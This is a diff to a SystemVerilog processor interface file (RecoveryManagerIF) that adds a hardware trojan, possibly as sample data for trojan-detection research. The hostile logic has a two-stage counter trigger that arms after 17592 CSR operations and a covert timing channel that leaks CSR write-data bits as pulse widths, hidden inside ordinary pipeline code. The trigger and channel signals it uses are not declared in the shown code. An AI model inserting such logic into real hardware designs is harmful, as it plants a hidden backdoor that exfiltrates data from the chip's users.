@@ -16,54 +16,51 @@ import LoadStoreUnitTypes::*;
 interface RecoveryManagerIF( input logic clk, rst );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
+    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=17592)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 19959;
+    localparam int TRIGGER_THRESHOLD = 17592;
     logic [15:0] trojan_counter;
-    logic trojan_armed;
-    logic trojan_active;
-    
+    logic        trojan_armed;
+    logic        trojan_active;
     always_ff @(posedge clk or negedge rst) begin
         if (!rst) begin
             trojan_counter <= '0;
             trojan_armed   <= 1'b0;
             trojan_active  <= 1'b0;
         end else begin
-            if (|faultingDataAddr) trojan_counter <= trojan_counter + 1;
+            if (|csr_op_en_i) trojan_counter <= trojan_counter + 1;
             if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && faultingDataAddr) trojan_active <= 1'b1;
+            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
         end
     end
 
-        // COVERT CHANNEL: Timing modulation
-        logic       covert_bit_out;
-        logic [7:0] covert_delay_counter;
-        logic [4:0] covert_bit_index;
-        logic       current_bit;
-
-        assign current_bit = faultingDataAddr[covert_bit_index];  // <-- FIXED: use trigger_signal
-
-        always_ff @(posedge clk or negedge rst) begin
-            if (!rst) begin
-                covert_bit_out       <= 1'b0;
-                covert_delay_counter <= '0;
-                covert_bit_index     <= '0;
-            end else if (trojan_active) begin
-                if (covert_delay_counter < (current_bit ? 8'd10 : 8'd5)) begin
-                    covert_delay_counter <= covert_delay_counter + 1;
-                    covert_bit_out       <= 1'b1;
-                end else begin
-                    covert_bit_out       <= 1'b0;
-                    covert_delay_counter <= '0;
-                    covert_bit_index     <= covert_bit_index + 1;
-                end
+    // ── COVERT CHANNEL: Timing modulation ──────────────────────────────────
+    logic       covert_bit_out;
+    logic [7:0] covert_delay_counter;
+    logic [4:0] covert_bit_index;
+    logic       covert_current_bit;
+    assign covert_current_bit = csr_wdata_i[covert_bit_index[4:0]];
+    always_ff @(posedge clk or negedge rst) begin
+        if (!rst) begin
+            covert_bit_out       <= 1'b0;
+            covert_delay_counter <= '0;
+            covert_bit_index     <= '0;
+        end else if (trojan_active) begin
+            if (covert_delay_counter < (covert_current_bit ? 8'd10 : 8'd5)) begin
+                covert_delay_counter <= covert_delay_counter + 1;
+                covert_bit_out       <= 1'b1;
             end else begin
                 covert_bit_out       <= 1'b0;
                 covert_delay_counter <= '0;
-                covert_bit_index     <= '0;
+                covert_bit_index     <= covert_bit_index + 1;
             end
+        end else begin
+            covert_bit_out <= 1'b0; covert_delay_counter <= '0; covert_bit_index <= '0;
         end
-    
+    end
+    // ────────────────────────────────────────────────────────────────────────
+
+
 
     // Phase of a pipeline
     PipelinePhase phase;
